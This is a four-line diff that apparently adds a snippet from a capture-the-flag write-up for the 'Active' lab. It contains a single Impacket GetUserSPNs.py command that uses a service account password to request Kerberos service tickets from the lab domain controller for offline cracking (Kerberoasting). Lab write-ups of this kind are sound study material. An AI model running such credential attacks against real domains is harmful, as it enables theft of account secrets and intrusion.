@@ -1,0 +1,4 @@
+
+```
+ GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
+```
